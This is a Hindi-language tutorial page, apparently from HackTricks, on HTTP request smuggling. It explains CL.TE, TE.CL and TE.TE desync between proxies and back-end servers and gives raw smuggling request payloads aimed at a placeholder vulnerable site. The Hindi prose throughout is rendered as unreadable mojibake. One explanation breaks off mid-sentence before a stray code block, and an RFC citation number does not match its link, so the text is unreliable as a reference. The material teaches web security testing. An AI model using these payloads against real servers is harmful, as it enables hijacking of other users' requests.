# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§≤‡•á‡§ï‡§∞ ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç**, ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç, ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§è‡§ï‡•ç‡§∏‡§ï‡•ç‡§≤‡•Ç‡§∏‡§ø‡§µ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π
* üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) ‡§Æ‡•á‡§Ç **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** ‡§Ø‡§æ [**telegram group**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§Ø‡§æ **Twitter** ‡§™‡§∞ ‡§Æ‡•Å‡§ù‡•á üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm) **‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∏‡§∞‡§£ ‡§ï‡§∞‡•á‡§Ç**.
* **‡§Ö‡§™‡§®‡•Ä ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á.

</details>

## ‡§ï‡•ç‡§Ø‡§æ ‡§π‡•à

‡§Ø‡§π ‡§≠‡•á‡§¶‡•ç‡§Ø‡§§‡§æ ‡§§‡§¨ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡§¨ **front-end proxies** ‡§î‡§∞ **back-end** ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ï‡•á ‡§¨‡•Ä‡§ö **‡§Ö‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§®** ‡§è‡§ï **‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞** ‡§ï‡•ã HTTP **request** ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á **front-end** proxies (load balance/reverse-proxy) ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **‡§è‡§ï‡§≤ request** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§î‡§∞ **back-end** ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **2 request** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç **‡§µ‡•ç‡§Ø‡§æ‡§ñ‡•ç‡§Ø‡§æ** ‡§ï‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä‡•§\
‡§á‡§∏‡§∏‡•á ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ **back-end ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§™‡§∞ ‡§Ö‡§™‡§®‡•á ‡§¨‡§æ‡§¶ ‡§Ü‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§Ö‡§ó‡§≤‡•á request ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à**‡•§

### ‡§∏‡§ø‡§¶‡•ç‡§ß‡§æ‡§Ç‡§§

[**RFC ‡§µ‡§ø‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ (2161)**](https://tools.ietf.org/html/rfc2616)

> ‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à ‡§∏‡§Ç‡§¶‡•á‡§∂ Transfer-Encoding ‡§π‡•á‡§°‡§∞ ‡§´‡•Ä‡§≤‡•ç‡§° ‡§î‡§∞ Content-Length ‡§π‡•á‡§°‡§∞ ‡§´‡•Ä‡§≤‡•ç‡§° ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§¨‡§æ‡§¶ ‡§µ‡§æ‡§≤‡•á ‡§ï‡•ã ‡§Ö‡§®‡§¶‡•á‡§ñ‡§æ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

**Content-Length**

> Content-Length ‡§á‡§ï‡§æ‡§à ‡§π‡•á‡§°‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã ‡§≠‡•á‡§ú‡•á ‡§ó‡§è ‡§á‡§ï‡§æ‡§à-‡§∂‡§∞‡•Ä‡§∞ ‡§ï‡•á ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡•ã ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§¶‡§∞‡•ç‡§∂‡§æ‡§§‡§æ ‡§π‡•à‡•§

**Transfer-Encoding: chunked**

> Transfer-Encoding ‡§π‡•á‡§°‡§∞ ‡§™‡•á‡§≤‡•ã‡§° ‡§∂‡§∞‡•Ä‡§∞ ‡§ï‡•ã ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§Ø‡•Å‡§ï‡•ç‡§§ ‡§è‡§®‡•ç‡§ï‡•ã‡§°‡§ø‡§Ç‡§ó ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§ï‡•ã ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§\
> Chunked ‡§ï‡§æ ‡§Ö‡§∞‡•ç‡§• ‡§π‡•à ‡§ï‡§ø ‡§¨‡§°‡§º‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§è‡§ï ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ ‡§Æ‡•á‡§Ç ‡§ö‡§Ç‡§ï‡•ç‡§∏ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à

### ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï‡§§‡§æ

**Front-End** (‡§è‡§ï load-balance / Reverse Proxy) _**content-length**_ ‡§Ø‡§æ _**transfer-encoding**_ ‡§π‡•á‡§°‡§∞ ‡§ï‡•ã **‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏** ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **Back-end** ‡§∏‡§∞‡•ç‡§µ‡§∞ **‡§¶‡•Ç‡§∏‡§∞‡•á** ‡§ï‡•ã ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ‡•ã‡§Ç ‡§ï‡•á ‡§¨‡•Ä‡§ö **‡§Ö‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§®** ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§\
‡§Ø‡§π ‡§¨‡§π‡•Å‡§§ ‡§ó‡§Ç‡§≠‡•Ä‡§∞ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø **‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§è‡§ï ‡§ê‡§∏‡§æ request ‡§≠‡•á‡§ú‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§ó‡§æ** ‡§ú‡§ø‡§∏‡•á reverse proxy ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **‡§µ‡•ç‡§Ø‡§æ‡§ñ‡•ç‡§Ø‡§æ** ‡§ï‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä ‡§î‡§∞ **back-end** ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§á‡§∏‡•á **2 ‡§Ö‡§≤‡§ó-‡§Ö‡§≤‡§ó requests** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç **‡§∏‡§Æ‡§ù‡•á‡§ó‡§æ**‡•§ ‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ **‡§ñ‡§§‡§∞‡§æ** ‡§á‡§∏ ‡§§‡§•‡•ç‡§Ø ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§π‡§ø‡§§ ‡§π‡•à ‡§ï‡§ø **back-end** ‡§∏‡§∞‡•ç‡§µ‡§∞ **2nd request ‡§ï‡•ã ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§ø‡§è ‡§ó‡§è** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç **‡§µ‡•ç‡§Ø‡§æ‡§ñ‡•ç‡§Ø‡§æ ‡§ï‡§∞‡•á‡§ó‡§æ** ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§Ø‡§π **‡§Ö‡§ó‡§≤‡•á ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï ‡§∏‡•á ‡§Ü‡§Ø‡§æ ‡§π‡•ã** ‡§î‡§∞ **‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï request** ‡§â‡§∏ ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï ‡§ï‡•Ä **‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§ø‡§è ‡§ó‡§è request ‡§ï‡§æ ‡§π‡§ø‡§∏‡•ç‡§∏‡§æ** ‡§π‡•ã‡§ó‡•Ä‡•§

### ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§è‡§Å

‡§Ø‡§æ‡§¶ ‡§∞‡§ñ‡•á‡§Ç ‡§ï‡§ø HTTP ‡§Æ‡•á‡§Ç **‡§®‡§à ‡§≤‡§æ‡§á‡§® ‡§ö‡§∞‡§ø‡§§‡•ç‡§∞ 2 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§∏‡•á ‡§¨‡§®‡§æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à:**

* **Content-Length**: ‡§Ø‡§π ‡§π‡•á‡§°‡§∞ ‡§è‡§ï **‡§¶‡§∂‡§Æ‡§≤‡§µ ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã request ‡§ï‡•á **‡§∂‡§∞‡•Ä‡§∞** ‡§ï‡•á **‡§¨‡§æ‡§á‡§ü‡•ç‡§∏** ‡§ï‡•Ä **‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ** ‡§ï‡•ã ‡§¶‡§∞‡•ç‡§∂‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§∂‡§∞‡•Ä‡§∞ ‡§ï‡§æ ‡§Ö‡§Ç‡§§ ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§ö‡§∞‡§ø‡§§‡•ç‡§∞ ‡§Æ‡•á‡§Ç ‡§π‡•ã‡§®‡•á ‡§ï‡•Ä ‡§â‡§Æ‡•ç‡§Æ‡•Ä‡§¶ ‡§π‡•à, **request ‡§ï‡•á ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç ‡§®‡§à ‡§≤‡§æ‡§á‡§® ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•Ä**‡•§
* **Transfer-Encoding:** ‡§Ø‡§π ‡§π‡•á‡§°‡§∞ **‡§∂‡§∞‡•Ä‡§∞** ‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§π‡•á‡§ï‡•ç‡§∏‡§æ‡§°‡•á‡§∏‡§ø‡§Æ‡§≤ ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã **‡§Ö‡§ó‡§≤‡•á ‡§ö‡§Ç‡§ï** ‡§ï‡•á **‡§¨‡§æ‡§á‡§ü‡•ç‡§∏** ‡§ï‡•Ä **‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ** ‡§ï‡•ã ‡§¶‡§∞‡•ç‡§∂‡§æ‡§§‡§æ ‡§π‡•à‡•§ **‡§ö‡§Ç‡§ï** ‡§ï‡•ã **‡§®‡§à ‡§≤‡§æ‡§á‡§®** ‡§ï‡•á ‡§∏‡§æ‡§• **‡§∏‡§Æ‡§æ‡§™‡•ç‡§§** ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π ‡§®‡§à ‡§≤‡§æ‡§á‡§® ‡§≤‡§Ç‡§¨‡§æ‡§à ‡§∏‡§Ç‡§ï‡•á‡§§‡§ï ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **‡§ó‡§ø‡§®‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§ú‡§æ‡§§‡•Ä** ‡§π‡•à‡•§ ‡§á‡§∏ ‡§ü‡•ç‡§∞‡§æ‡§Ç‡§∏‡§´‡§∞ ‡§µ‡§ø‡§ß‡§ø ‡§ï‡§æ ‡§Ö‡§Ç‡§§ **‡§Ü‡§ï‡§æ‡§∞ 0 ‡§ï‡•á ‡§ö‡§Ç‡§ï ‡§ï‡•á ‡§∏‡§æ‡§• ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§ú‡§ø‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶ 2 ‡§®‡§à ‡§≤‡§æ‡§á‡§®‡•á‡§Ç ‡§π‡•ã‡§Ç**: `0`
* **Connection**: ‡§Æ‡•á‡§∞‡•á ‡§Ö‡§®‡•Å‡§≠‡§µ ‡§ï‡•á ‡§Ü‡§ß‡§æ‡§∞ ‡§™‡§∞, request Smuggling ‡§ï‡•á ‡§™‡§π‡§≤‡•á request ‡§Æ‡•á‡§Ç **`Connection: keep-alive`** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§∏‡§ø‡§´‡§æ‡§∞‡§ø‡§∂ ‡§ï‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à‡•§

## ‡§Æ‡•Ç‡§≤ ‡§â‡§¶‡§æ‡§π‡§∞‡§£

‡§§‡•ã, request smuggling ‡§π‡§Æ‡§≤‡•á ‡§è‡§ï ‡§π‡•Ä HTTP request ‡§Æ‡•á‡§Ç `Content-Length` ‡§π‡•á‡§°‡§∞ ‡§î‡§∞ `Transfer-Encoding` ‡§π‡•á‡§°‡§∞ ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§∞‡§ñ‡§®‡•á ‡§î‡§∞ ‡§á‡§®‡•ç‡§π‡•á‡§Ç ‡§á‡§∏ ‡§§‡§∞‡§π ‡§∏‡•á ‡§Æ‡•à‡§®‡§ø‡§™‡•Å‡§≤‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø front-end ‡§î‡§∞ back-end ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§Ö‡§≤‡§ó-‡§Ö‡§≤‡§ó ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á request ‡§ï‡•ã ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡§∞‡•á‡§Ç‡•§ ‡§á‡§∏‡•á ‡§ï‡§ø‡§∏ ‡§§‡§∞‡§π ‡§∏‡•á ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§Ø‡§π ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§∏‡§∞‡•ç‡§µ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞ ‡§™‡§∞ ‡§®‡§ø‡§∞‡•ç‡§≠‡§∞ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à:

* **CL.TE**: front-end ‡§∏‡§∞‡•ç‡§µ‡§∞ `Content-Length` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ back-end ‡§∏‡§∞‡•ç‡§µ‡§∞ `Transfer-Encoding` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§
* **TE.CL**: front-end ‡§∏‡§∞‡•ç‡§µ‡§∞ `Transfer-Encoding` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ back-end ‡§∏‡§∞‡•ç‡§µ‡§∞ `Content-Length` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§
* **TE.TE**: front-end ‡§î‡§∞ back-end ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§¶‡•ã‡§®‡•ã‡§Ç `Transfer-Encoding` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§≤‡•á‡§ï‡§ø‡§® ‡§∏‡§∞‡•ç‡§µ‡§∞‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§è‡§ï ‡§ï‡•ã ‡§π‡•á‡§°‡§∞ ‡§ï‡•ã ‡§ï‡§ø‡§∏‡•Ä ‡§§‡§∞‡§π ‡§∏‡•á ‡§Ö‡§∏‡•ç‡§™‡§∑‡•ç‡§ü ‡§ï‡§∞‡§ï‡•á ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡•á‡§∞‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

### CL.TE ‡§≠‡•á‡§¶‡•ç‡§Ø‡§§‡§æ‡§è‡§Å

‡§Ø‡§π‡§æ‡§Å, **front-end** ‡§∏‡§∞‡•ç‡§µ‡§∞ **`Content-Length`** ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **back-end** ‡§∏‡§∞‡•ç‡§µ‡§∞ **`Transfer-Encoding`** ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ‡•§ ‡§π‡§Æ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§∏‡§∞‡§≤ HTTP request smuggling ‡§π‡§Æ‡§≤‡§æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø `Content-Length` ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ï‡§ø **‡§¨‡•â‡§°‡•Ä‡§ú‡§º request ‡§ï‡•Ä ‡§≤‡§Ç‡§¨‡§æ‡§à 30 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§≤‡§Ç‡§¨‡•Ä ‡§π‡•à** (_‡§Ø‡§æ‡§¶ ‡§∞‡§ñ‡•á‡§Ç ‡§ï‡§ø HTTP ‡§®‡§à ‡§≤‡§æ‡§á‡§® ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§®‡§à ‡§≤‡§æ‡§á‡§® 2‡§¨‡§æ‡§á‡§ü‡•ç‡§∏_), ‡§á‡§∏‡§≤‡§ø‡§è reverse proxy **‡§™‡•Ç‡§∞‡§æ request back-end ‡§ï‡•ã ‡§≠‡•á‡§ú ‡§¶‡•á‡§ó‡§æ**, ‡§î‡§∞ back-end `Transfer-Encoding` ‡§π‡•á‡§°‡§∞ ‡§ï‡•ã ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡§ø‡§∏‡§∏‡•á `GET /404 HTTP/1.1` **‡§Ö‡§ó‡§≤‡•á request ‡§ï‡•Ä ‡§∂‡•Å‡§∞‡•Å‡§Ü‡§§ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§õ‡•ã‡§°‡§º ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ** (‡§µ‡•à‡§∏‡•á, ‡§Ö‡§ó‡§≤‡§æ request `Foo:x<Next request starts here>` ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡§æ ‡§π‡•ã‡§ó‡§æ)‡•§

### TE.CL ‡§≠‡•á‡§¶‡•ç‡§Ø‡§§‡§æ‡§è‡§Å

‡§Ø‡§π‡§æ‡§Å, front-end ‡§∏‡§∞‡•ç‡§µ‡§∞ `Transfer-Encoding` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ back-end ‡§∏‡§∞‡•ç‡§µ‡§∞ `Content-Length` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ‡•§ ‡§π‡§Æ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§∏‡§∞‡§≤ HTTP request smuggling ‡§π‡§Æ‡§≤‡§æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç **reverse-proxy** **‡§™‡•Ç‡§∞‡§æ request back-end ‡§ï‡•ã ‡§≠‡•á‡§ú ‡§¶‡•á‡§ó‡§æ** ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø **`Transfer-encoding`** ‡§ê‡§∏‡§æ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§≤‡•á‡§ï‡§ø‡§®, **back-end** ‡§ï‡•á‡§µ‡§≤ **`7b`** (4‡§¨‡§æ‡§á‡§ü‡•ç‡§∏) ‡§ï‡•ã ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø `Content-Length` ‡§Æ‡•á‡§Ç ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ö‡§ó‡§≤‡§æ request ‡§µ‡§π ‡§π‡•ã‡§ó‡§æ ‡§ú‡•ã `GET /404 HTTP/1.1` ‡§∏‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§

_‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§π‡§Æ‡§≤‡§æ `0` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è, ‡§Ö‡§ó‡§≤‡§æ request **x** ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§ï‡•á ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§_\
_‡§Ø‡§π ‡§≠‡•Ä ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§è‡§Æ‡•ç‡§¨‡•á‡§°‡•á‡§° request ‡§ï‡§æ Content-Length ‡§Ö‡§ó‡§≤‡•á request ‡§ï‡•Ä ‡§≤‡§Ç‡§¨‡§æ‡§à ‡§ï‡•ã ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
